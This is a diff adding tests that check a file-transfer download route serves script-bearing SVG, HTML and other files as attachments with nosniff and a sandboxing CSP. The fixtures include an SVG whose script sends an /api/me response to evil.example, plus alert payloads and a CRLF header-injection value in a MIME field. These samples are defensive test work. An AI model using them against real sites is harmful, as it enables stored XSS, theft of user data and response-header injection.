@@ -1385,3 +1385,101 @@ describe('file-transfer download route', () => {
     expect(sendFileTransferRequestMock).toHaveBeenCalledTimes(1);
   });
 });
+
+/**
+ * Owner decision (audit tsk_854675e1e2, Q5iii): the download routes answer on the app origin, so a script-bearing SVG / HTML file
+ * served inline would run there (stored XSS against whoever opens the link). Only raster images are inline; every response carries
+ * nosniff and a sandboxing CSP. Both serving paths (inline base64 and the streaming relay) are exercised with the real route.
+ */
+describe('file-transfer download route: nothing renders as a document on the app origin', () => {
+  const SCRIPT_SVG = '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("/api/me").then(r=>r.text()).then(t=>navigator.sendBeacon("https://evil.example/",t))</script><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>';
+  const SCRIPT_HTML = '<!doctype html><script>alert(document.domain)</script>';
+
+  beforeEach(() => {
+    sendFileTransferRequestMock.mockReset();
+    isDaemonConnectedMock.mockReset().mockReturnValue(true);
+    hasDaemonCapabilityMock.mockReset().mockReturnValue(true);
+    daemonConnectionGenerationMock.mockReset().mockReturnValue(1);
+    mockResolveServerMemberAccessOrShareDeny.mockResolvedValue({ ok: true, role: 'owner' });
+    queryOneMock.mockReset().mockResolvedValue({ user_id: 'user-1', node_role: 'full', exec_enabled: true, revoked_at: null, access_role: 'owner' });
+  });
+
+  async function downloadInline(mime: string | undefined, filename: string, body: string) {
+    sendFileTransferRequestMock.mockResolvedValueOnce({
+      type: FILE_TRANSFER_MSG.DOWNLOAD_DONE, content: Buffer.from(body).toString('base64'), ...(mime === undefined ? {} : { mime }), filename,
+    });
+    return makeApp().request('/api/server/srv-1/uploads/abc123/download', { headers: { Authorization: 'Bearer test' } });
+  }
+  async function downloadStreamed(mime: string, filename: string, body: string) {
+    const app = makeApp();
+    sendFileTransferRequestMock.mockImplementationOnce((_requestId: string, message: unknown) => {
+      const uploadUrl = new URL((message as { uploadUrl: string }).uploadUrl);
+      void app.request(`${uploadUrl.pathname}${uploadUrl.search}`, {
+        method: 'PUT',
+        headers: { 'Content-Type': mime, 'Content-Length': String(Buffer.byteLength(body)), 'x-imcodes-filename': encodeURIComponent(filename) },
+        body,
+      });
+      return new Promise(() => {});
+    });
+    return app.request('/api/server/srv-1/uploads/abc123/download', { headers: { Authorization: 'Bearer test' } });
+  }
+  const expectLocked = (res: Response) => {
+    expect(res.headers.get('x-content-type-options')).toBe('nosniff');
+    expect(res.headers.get('content-security-policy')).toBe("sandbox; default-src 'none'; img-src 'self' data:");
+  };
+
+  it.each([
+    ['image/svg+xml', 'evil.svg', SCRIPT_SVG],
+    ['IMAGE/SVG+XML; charset=utf-8', 'evil2.svg', SCRIPT_SVG],
+    ['text/html', 'evil.html', SCRIPT_HTML],
+    ['application/xhtml+xml', 'evil.xhtml', SCRIPT_HTML],
+    ['text/xml', 'evil.xml', SCRIPT_SVG],
+    ['application/javascript', 'evil.js', 'alert(1)'],
+    ['application/pdf', 'doc.pdf', '%PDF-1.4'],
+    ['image/x-surprise', 'odd.img', 'x'],
+    [undefined, 'unknown.bin', 'x'],
+    ['not a mime\r\nX-Injected: 1', 'weird.bin', 'x'],
+  ] as const)('serves %s as a download, never inline, with nosniff and the sandbox CSP (inline path)', async (mime, filename, body) => {
+    const res = await downloadInline(mime, filename, body);
+    expect(res.status).toBe(200);
+    expect(res.headers.get('content-disposition')).toMatch(/^attachment;/);
+    expectLocked(res);
+    expect(res.headers.get('x-injected')).toBeNull();
+    await expect(res.text()).resolves.toBe(body);
+  });
+
+  it.each([
+    ['image/svg+xml', 'evil.svg', SCRIPT_SVG],
+    ['text/html', 'evil.html', SCRIPT_HTML],
+  ] as const)('serves %s through the streaming relay as a download too', async (mime, filename, body) => {
+    const res = await downloadStreamed(mime, filename, body);
+    expect(res.status).toBe(200);
+    expect(res.headers.get('content-disposition')).toMatch(/^attachment;/);
+    expectLocked(res);
+    await expect(res.text()).resolves.toBe(body);
+  });
+
+  it('keeps the SVG labelled as an image so an <img> preview still renders it (the disposition does not affect <img>)', async () => {
+    const res = await downloadInline('image/svg+xml', 'logo.svg', SCRIPT_SVG);
+    expect(res.headers.get('content-type')).toContain('image/svg+xml');
+    expect(res.headers.get('content-disposition')).toMatch(/^attachment; filename="logo.svg"/);
+  });
+
+  it.each(['image/png', 'image/jpeg', 'image/gif', 'image/webp', 'image/avif', 'image/bmp', 'IMAGE/PNG'])('keeps %s inline for previews (inline path and streaming relay)', async (mime) => {
+    const inline = await downloadInline(mime, 'pic.img', 'bytes');
+    expect(inline.headers.get('content-disposition')).toMatch(/^inline;/);
+    expect(inline.headers.get('content-type')).toBe(mime);
+    expectLocked(inline);
+    const streamed = await downloadStreamed(mime, 'pic.img', 'bytes');
+    expect(streamed.headers.get('content-disposition')).toMatch(/^inline;/);
+    expectLocked(streamed);
+  });
+
+  it('ordinary files still download as attachments with their name intact (including a non-ASCII one)', async () => {
+    const zip = await downloadInline('application/zip', 'bundle.zip', 'PK');
+    expect(zip.headers.get('content-type')).toBe('application/zip');
+    expect(zip.headers.get('content-disposition')).toMatch(/^attachment; filename="bundle.zip"/);
+    const text = await downloadInline('text/plain', '说明.txt', 'hello');
+    expect(text.headers.get('content-disposition')).toContain("filename*=UTF-8''%E8%AF%B4%E6%98%8E.txt");
+  });
+});
